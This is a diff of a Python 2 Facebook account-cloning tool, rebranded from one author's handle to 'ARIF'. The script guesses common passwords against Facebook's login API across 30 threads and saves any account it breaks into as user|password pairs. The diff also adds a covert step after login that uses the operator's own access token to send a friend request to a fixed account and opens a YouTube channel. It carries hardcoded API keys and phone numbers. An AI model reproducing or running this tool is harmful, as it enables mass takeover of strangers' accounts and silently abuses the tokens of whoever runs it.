@@ -1,6 +1,6 @@
 #!/usr/bin/python2
 #coding=utf-8
-#The Credit For This Code Goes To lovehacker
+#The Credit For This Code Goes To 
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
 #Reserved2020
 
@@ -48,7 +48,7 @@ def jalan(z):
 		sys.stdout.flush()
 		time.sleep(0.07)
 
-#Dev:love_hacker
+#Dev:ARIF
 ##### LOGO #####
 logo = """
 \033[1;91m:•◈•╭━━╮╭╮╱╱╱╱╱╱╭╮╱╭━╮╭━╮╱╱╱╭━╮    :•◈•
@@ -61,7 +61,7 @@ logo = """
 \033[1;91m:•◈•╔╗─────────╔╗───────╔╗
 \033[1;91m:•◈•║║─────────║║───────║║
 \033[1;91m:•◈•║║╔══╦╗╔╦══╣╚═╦══╦══╣║╔╦══╦═╗
-\033[1;91m:•◈•║║║╔╗║╚╝║║═╣╔╗║╔╗║╔═╣╚╝╣║═╣╔╝   World
+\033[1;91m:•◈•║║║╔╗║╚╝║║═╣╔╗║╔╗║╔═╣╚╝╣║═╣╔╝   ARIF TOOLS
 \033[1;91m:•◈•║╚╣╚╝╠╗╔╣║═╣║║║╔╗║╚═╣╔╗╣║═╣║    Cloning
 \033[1;91m:•◈•╚═╩══╝╚╝╚══╩╝╚╩╝╚╩══╩╝╚╩══╩╝
 \033[1;94m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91mARIF\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"""
@@ -101,18 +101,19 @@ jalan("\033[1;95m▬▬20%")
 jalan('\033[1;95m▬▬▬30%')
 jalan('\033[1;95m▬▬▬▬40%')
 jalan("\033[1;95m▬▬▬▬▬50%")
-jalan("\033[1;95m▬▬▬▬▬▬60%    \033[1;91m")
+jalan("\033[1;95m▬▬▬▬▬▬60%")
 jalan('\033[1;95m▬▬▬▬▬▬▬70%')
 jalan('\033[1;95m▬▬▬▬▬▬▬▬80%')
 jalan('\033[1;95m▬▬▬▬▬▬▬▬▬90%')
 jalan('\033[1;95m▬▬▬▬▬▬▬▬▬100%')
 print "\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mARIF\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 
-CorrectUsername = "arif"
-CorrectPassword = "arif"
 
 CorrectUsername = "bd"
 CorrectPassword = "bd"
+
+CorrectUsername = "ARIF"
+CorrectPassword = "ARIF"
 
 loop = 'true'
 while (loop == 'true'):
@@ -123,7 +124,12 @@ while (loop == 'true'):
             print "Logged in successfully as " + username #Dev:ARIF
 	    time.sleep(2)
             loop = 'false'
-
+        else:
+            print "\033[1;93mWrong Password"
+           
+    else:
+        print "\033[1;94mWrong Username"
+ 
 def login():
 	os.system('clear')
 	try:
@@ -142,7 +148,7 @@ def login():
 		pwd = raw_input('\033[1;91m[+] \x1b[1;91mPassword\x1b[1;96m: \x1b[1;93m')
 		tik()
 		try:
-			br.open('https://m.facebook.com')
+			br.open('https://mbasic.facebook.com')
 		except mechanize.URLError:
 			print"\n\x1b[1;96mThere is no internet connection"
 			keluar()
@@ -167,7 +173,9 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;92mLogin Successful.•◈•..'
-				
+				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
+				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\x1b[1;91mThere is no internet connection"
 				keluar()
@@ -306,7 +314,7 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:love_hacker
+			pass #Dev:ARIF
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
@@ -409,9 +417,7 @@ def pilih_super():
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
 																	cekpoint.append(user+pass7)
-																	
-														a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-			b = json.loads(a.text)
+	
 			pass8 = ('786786')
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
@@ -431,23 +437,23 @@ def pilih_super():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mKARIF\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;93m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:ARIF
-	print '\033[1;91m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 ARIF.py)↩\033[1;92m....'
+	print "\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mARIF\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;93m«---•◈•---Developed By ARIF--•◈•---»" #Dev:ARIF
+	print '\033[1;91m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 World.py)↩\033[1;92m....'
 	print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))
 	print """
              
              ╔══╗░░░░╔╦╗░░╔═════╗    
-             ║╚═╬════╬╣╠═╗║░▀░▀░║    
-             ╠═╗║╔╗╔╗║║║╩╣║╚═══╝║   
-             ╚══╩╝╚╝╚╩╩╩═╝╚═════╝    
+             ║╚═╬════╬╣╠═╗║░▀░▀░║    ARIFUL ISLAM
+             ╠═╗║╔╗╔╗║║║╩╣║╚═══╝║    WhatsApp
+             ╚══╩╝╚╝╚╩╩╩═╝╚═════╝    01721919797
              Checkpoint ID Open After 7 Days
 
 •\033[1;91m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;93m .....ARIF....... \033[1;91m :
+: \033[1;93m .....  ARIF....... \033[1;91m :
 •\033[1;91m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 WhatsApp Num
-              \033[1;93m 01721919797"""
+              \033[1;93m +923094161457"""
 	
 	raw_input("\n\033[1;92m[\033[1;91mBack\033[1;96m]")
 	menu()
